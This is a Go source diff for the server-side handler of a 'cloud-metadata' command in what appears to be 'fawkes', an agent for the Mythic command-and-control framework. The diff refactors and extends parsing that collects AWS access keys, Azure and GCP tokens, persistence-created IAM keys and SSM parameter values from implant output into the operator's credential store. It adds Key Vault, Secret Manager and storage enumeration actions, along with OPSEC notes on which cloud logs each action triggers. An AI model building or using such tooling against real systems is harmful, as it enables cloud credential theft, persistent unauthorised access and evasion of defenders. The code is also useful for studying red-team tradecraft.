@@ -9,14 +9,110 @@ import (
 	"github.com/MythicMeta/MythicContainer/mythicrpc"
 )
 
+type cloudCredential struct {
+	CredType   string
+	Account    string
+	Credential string
+	Comment    string
+}
+
+func parseAWSAccessKeys(responseText string) *cloudCredential {
+	lines := strings.Split(responseText, "\n")
+	var accessKey, secretKey, roleName string
+	for _, line := range lines {
+		line = strings.TrimSpace(line)
+		if strings.HasPrefix(line, "AccessKeyId:") {
+			accessKey = strings.TrimSpace(strings.TrimPrefix(line, "AccessKeyId:"))
+		} else if strings.HasPrefix(line, "SecretAccessKey:") {
+			secretKey = strings.TrimSpace(strings.TrimPrefix(line, "SecretAccessKey:"))
+		} else if strings.HasPrefix(line, "[+] AWS IAM Role:") {
+			roleName = strings.TrimSpace(strings.TrimPrefix(line, "[+] AWS IAM Role:"))
+		}
+	}
+	if accessKey == "" || secretKey == "" {
+		return nil
+	}
+	account := "AWS IAM"
+	if roleName != "" {
+		account = fmt.Sprintf("AWS IAM (%s)", roleName)
+	}
+	return &cloudCredential{
+		CredType:   "key",
+		Account:    account,
+		Credential: fmt.Sprintf("AccessKeyId=%s SecretAccessKey=%s", accessKey, secretKey),
+		Comment:    "cloud-metadata (AWS IAM)",
+	}
+}
+
+func detectCloudProvider(responseText string) string {
+	if strings.Contains(responseText, "Azure") {
+		return "Azure"
+	} else if strings.Contains(responseText, "GCP") || strings.Contains(responseText, "google") {
+		return "GCP"
+	}
+	return "Cloud"
+}
+
+func parseCloudToken(responseText string) *cloudCredential {
+	lines := strings.Split(responseText, "\n")
+	for _, line := range lines {
+		line = strings.TrimSpace(line)
+		if strings.HasPrefix(line, "access_token:") || strings.HasPrefix(line, "Token:") {
+			token := strings.TrimSpace(strings.SplitN(line, ":", 2)[1])
+			if len(token) > 10 {
+				provider := detectCloudProvider(responseText)
+				return &cloudCredential{
+					CredType:   "token",
+					Account:    fmt.Sprintf("%s Managed Identity", provider),
+					Credential: token,
+					Comment:    fmt.Sprintf("cloud-metadata (%s token)", provider),
+				}
+			}
+		}
+	}
+	return nil
+}
+
+func parsePersistCredential(responseText string) *cloudCredential {
+	lines := strings.Split(responseText, "\n")
+	var accessKey, secretKey, account string
+	for _, line := range lines {
+		line = strings.TrimSpace(line)
+		if strings.HasPrefix(line, "AccessKey:") {
+			accessKey = strings.TrimSpace(strings.TrimPrefix(line, "AccessKey:"))
+		} else if strings.HasPrefix(line, "SecretKey:") {
+			secretKey = strings.TrimSpace(strings.TrimPrefix(line, "SecretKey:"))
+		} else if strings.HasPrefix(line, "Account:") {
+			account = strings.TrimSpace(strings.TrimPrefix(line, "Account:"))
+		} else if strings.HasPrefix(line, "App ID:") && !strings.Contains(line, "Object") {
+			accessKey = strings.TrimSpace(strings.TrimPrefix(line, "App ID:"))
+		} else if strings.HasPrefix(line, "Secret:") {
+			secretKey = strings.TrimSpace(strings.TrimPrefix(line, "Secret:"))
+		}
+	}
+	if accessKey == "" || secretKey == "" {
+		return nil
+	}
+	provider := "AWS"
+	if strings.Contains(responseText, "Azure") {
+		provider = "Azure"
+	}
+	return &cloudCredential{
+		CredType:   "key",
+		Account:    fmt.Sprintf("%s Persist (%s)", provider, account),
+		Credential: fmt.Sprintf("ID=%s Secret=%s", accessKey, secretKey),
+		Comment:    fmt.Sprintf("cloud-metadata %s-persist (long-lived)", strings.ToLower(provider)),
+	}
+}
+
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "cloud-metadata",
 		Description:         "Probe cloud instance metadata services (AWS/Azure/GCP/DigitalOcean) for credentials, identity, and configuration. Supports IMDSv2 for AWS.",
-		HelpString:          "cloud-metadata -action detect\ncloud-metadata -action creds\ncloud-metadata -action all -provider aws\ncloud-metadata -action aws-iam\ncloud-metadata -action azure-graph\ncloud-metadata -action gcp-iam",
-		Version:             1,
+		HelpString:          "cloud-metadata -action detect\ncloud-metadata -action creds\ncloud-metadata -action storage\ncloud-metadata -action all -provider aws\ncloud-metadata -action aws-iam\ncloud-metadata -action aws-s3\ncloud-metadata -action azure-blob\ncloud-metadata -action gcp-gcs",
+		Version:             2,
 		Author:              "@galoryber",
-		MitreAttackMappings: []string{"T1552.005", "T1580", "T1526", "T1098.001"},
+		MitreAttackMappings: []string{"T1552.005", "T1580", "T1526", "T1098.001", "T1602", "T1530"},
 		CommandAttributes: agentstructs.CommandAttribute{
 			SupportedOS: []string{
 				agentstructs.SUPPORTED_OS_WINDOWS,
@@ -32,10 +128,10 @@ func init() {
 			{
 				Name:          "action",
 				CLIName:       "action",
-				Description:   "Action: detect, all, creds, identity, userdata, network, aws-iam, azure-graph, gcp-iam, aws-persist, azure-persist",
+				Description:   "Action: detect, all, creds, identity, userdata, network, storage, aws-iam, azure-graph, gcp-iam, aws-persist, azure-persist, aws-ssm, azure-keyvault, gcp-secrets, aws-s3, azure-blob, gcp-gcs",
 				DefaultValue:  "detect",
 				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Choices:       []string{"detect", "all", "creds", "identity", "userdata", "network", "aws-iam", "azure-graph", "gcp-iam", "aws-persist", "azure-persist"},
+				Choices:       []string{"detect", "all", "creds", "identity", "userdata", "network", "storage", "aws-iam", "azure-graph", "gcp-iam", "aws-persist", "azure-persist", "aws-ssm", "azure-keyvault", "gcp-secrets", "aws-s3", "azure-blob", "gcp-gcs"},
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
 						ParameterIsRequired: false,
@@ -92,92 +188,29 @@ func init() {
 			hostname := processResponse.TaskData.Callback.Host
 			var creds []mythicrpc.MythicRPCCredentialCreateCredentialData
 
-			// Extract AWS access keys if present
 			if strings.Contains(responseText, "AccessKeyId") {
-				lines := strings.Split(responseText, "\n")
-				var accessKey, secretKey, roleName string
-				for _, line := range lines {
-					line = strings.TrimSpace(line)
-					if strings.HasPrefix(line, "AccessKeyId:") {
-						accessKey = strings.TrimSpace(strings.TrimPrefix(line, "AccessKeyId:"))
-					} else if strings.HasPrefix(line, "SecretAccessKey:") {
-						secretKey = strings.TrimSpace(strings.TrimPrefix(line, "SecretAccessKey:"))
-					} else if strings.HasPrefix(line, "[+] AWS IAM Role:") {
-						roleName = strings.TrimSpace(strings.TrimPrefix(line, "[+] AWS IAM Role:"))
-					}
-				}
-				if accessKey != "" && secretKey != "" {
-					account := "AWS IAM"
-					if roleName != "" {
-						account = fmt.Sprintf("AWS IAM (%s)", roleName)
-					}
+				if c := parseAWSAccessKeys(responseText); c != nil {
 					creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
-						CredentialType: "key",
-						Realm:          hostname,
-						Account:        account,
-						Credential:     fmt.Sprintf("AccessKeyId=%s SecretAccessKey=%s", accessKey, secretKey),
-						Comment:        "cloud-metadata (AWS IAM)",
+						CredentialType: c.CredType, Realm: hostname, Account: c.Account,
+						Credential: c.Credential, Comment: c.Comment,
 					})
 				}
 			}
 
-			// Extract Azure/GCP tokens if present
 			if strings.Contains(responseText, "access_token") {
-				lines := strings.Split(responseText, "\n")
-				for _, line := range lines {
-					line = strings.TrimSpace(line)
-					if strings.HasPrefix(line, "access_token:") || strings.HasPrefix(line, "Token:") {
-						token := strings.TrimSpace(strings.SplitN(line, ":", 2)[1])
-						if len(token) > 10 {
-							provider := "Cloud"
-							if strings.Contains(responseText, "Azure") {
-								provider = "Azure"
-							} else if strings.Contains(responseText, "GCP") || strings.Contains(responseText, "google") {
-								provider = "GCP"
-							}
-							creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
-								CredentialType: "token",
-								Realm:          hostname,
-								Account:        fmt.Sprintf("%s Managed Identity", provider),
-								Credential:     token,
-								Comment:        fmt.Sprintf("cloud-metadata (%s token)", provider),
-							})
-							break // Only capture first token
-						}
-					}
+				if c := parseCloudToken(responseText); c != nil {
+					creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
+						CredentialType: c.CredType, Realm: hostname, Account: c.Account,
+						Credential: c.Credential, Comment: c.Comment,
+					})
 				}
 			}
 
-			// Extract persist-created credentials (AccessKey + SecretKey from aws-persist output)
 			if strings.Contains(responseText, "SUCCESS: Created") {
-				lines := strings.Split(responseText, "\n")
-				var accessKey, secretKey, account string
-				for _, line := range lines {
-					line = strings.TrimSpace(line)
-					if strings.HasPrefix(line, "AccessKey:") {
-						accessKey = strings.TrimSpace(strings.TrimPrefix(line, "AccessKey:"))
-					} else if strings.HasPrefix(line, "SecretKey:") {
-						secretKey = strings.TrimSpace(strings.TrimPrefix(line, "SecretKey:"))
-					} else if strings.HasPrefix(line, "Account:") {
-						account = strings.TrimSpace(strings.TrimPrefix(line, "Account:"))
-					} else if strings.HasPrefix(line, "App ID:") && !strings.Contains(line, "Object") {
-						// Azure app ID
-						accessKey = strings.TrimSpace(strings.TrimPrefix(line, "App ID:"))
-					} else if strings.HasPrefix(line, "Secret:") {
-						secretKey = strings.TrimSpace(strings.TrimPrefix(line, "Secret:"))
-					}
-				}
-				if accessKey != "" && secretKey != "" {
-					provider := "AWS"
-					if strings.Contains(responseText, "Azure") {
-						provider = "Azure"
-					}
+				if c := parsePersistCredential(responseText); c != nil {
 					creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
-						CredentialType: "key",
-						Realm:          hostname,
-						Account:        fmt.Sprintf("%s Persist (%s)", provider, account),
-						Credential:     fmt.Sprintf("ID=%s Secret=%s", accessKey, secretKey),
-						Comment:        fmt.Sprintf("cloud-metadata %s-persist (long-lived)", strings.ToLower(provider)),
+						CredentialType: c.CredType, Realm: hostname, Account: c.Account,
+						Credential: c.Credential, Comment: c.Comment,
 					})
 				}
 			}
@@ -211,6 +244,53 @@ func init() {
 			case "aws-persist", "azure-persist":
 				tagTask(processResponse.TaskData.Task.ID, "PERSIST",
 					fmt.Sprintf("Cloud persistence: %s (T1098.001)", action))
+			case "aws-ssm":
+				createArtifact(processResponse.TaskData.Task.ID, "Cloud Discovery",
+					"AWS SSM Parameter Store enumeration (T1602)")
+				// Extract SSM parameter values as credentials
+				if strings.Contains(responseText, "Value:") {
+					lines := strings.Split(responseText, "\n")
+					for _, line := range lines {
+						line = strings.TrimSpace(line)
+						if strings.HasPrefix(line, "Name:") {
+							paramName := strings.TrimSpace(strings.TrimPrefix(line, "Name:"))
+							// Look for the next Value: line
+							for _, vline := range lines {
+								vline = strings.TrimSpace(vline)
+								if strings.HasPrefix(vline, "Value:") {
+									paramValue := strings.TrimSpace(strings.TrimPrefix(vline, "Value:"))
+									if len(paramValue) > 0 {
+										creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
+											CredentialType: "key",
+											Realm:          hostname,
+											Account:        fmt.Sprintf("AWS SSM: %s", paramName),
+											Credential:     paramValue,
+											Comment:        "cloud-metadata aws-ssm (T1602)",
+										})
+									}
+									break
+								}
+							}
+						}
+					}
+				}
+			case "azure-keyvault":
+				createArtifact(processResponse.TaskData.Task.ID, "Cloud Discovery",
+					"Azure Key Vault secret enumeration (T1602)")
+				tagTask(processResponse.TaskData.Task.ID, "CRED", "Azure Key Vault secrets accessed")
+			case "gcp-secrets":
+				createArtifact(processResponse.TaskData.Task.ID, "Cloud Discovery",
+					"GCP Secret Manager enumeration (T1602)")
+				tagTask(processResponse.TaskData.Task.ID, "CRED", "GCP secrets accessed")
+			case "storage", "aws-s3", "aws-storage":
+				createArtifact(processResponse.TaskData.Task.ID, "Cloud Discovery",
+					"AWS S3 bucket enumeration (T1530)")
+			case "azure-blob", "azure-storage":
+				createArtifact(processResponse.TaskData.Task.ID, "Cloud Discovery",
+					"Azure Blob Storage container enumeration (T1530)")
+			case "gcp-gcs", "gcp-storage":
+				createArtifact(processResponse.TaskData.Task.ID, "Cloud Discovery",
+					"GCP Cloud Storage bucket enumeration (T1530)")
 			}
 
 			return response
@@ -229,6 +309,18 @@ func init() {
 				msg += " HIGH RISK: Creating IAM access keys generates CloudTrail events (CreateAccessKey). This is a high-fidelity indicator of credential persistence (T1098.001). GuardDuty and CSPM tools actively alert on unusual CreateAccessKey calls."
 			case "azure-persist":
 				msg += " HIGH RISK: Creating Azure AD app registrations and client secrets generates audit events (Add application, Update application). This is a persistence indicator (T1098.001). Defender for Cloud may alert on managed identity creating app registrations."
+			case "aws-ssm":
+				msg += " AWS SSM Parameter Store access is logged in CloudTrail (GetParameter, DescribeParameters). SecureString parameters with WithDecryption=true generate KMS Decrypt events. GuardDuty watches for unusual SSM access patterns."
+			case "azure-keyvault":
+				msg += " Azure Key Vault access is logged in Key Vault diagnostic logs and Azure Activity Log. GetSecret operations generate AuditEvent entries. Defender for Key Vault alerts on suspicious access patterns from managed identities."
+			case "gcp-secrets":
+				msg += " GCP Secret Manager access is logged in Cloud Audit Logs (AccessSecretVersion). IAM conditions and VPC Service Controls may restrict access. Security Command Center alerts on unusual service account activity."
+			case "storage", "aws-s3", "aws-storage":
+				msg += " AWS S3 ListBuckets and ListObjectsV2 are logged in CloudTrail as data events. S3 access logging (if enabled per-bucket) records every object-level request. GuardDuty detects anomalous S3 access patterns."
+			case "azure-blob", "azure-storage":
+				msg += " Azure Blob Storage list operations are logged in Azure Storage Analytics and Activity Log. Defender for Storage alerts on anomalous access from managed identities."
+			case "gcp-gcs", "gcp-storage":
+				msg += " GCP Cloud Storage list operations are logged in Cloud Audit Logs (storage.buckets.list, storage.objects.list). VPC Service Controls may restrict access. Security Command Center alerts on unusual service account data access."
 			}
 			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
 				TaskID: taskData.Task.ID, Success: true,
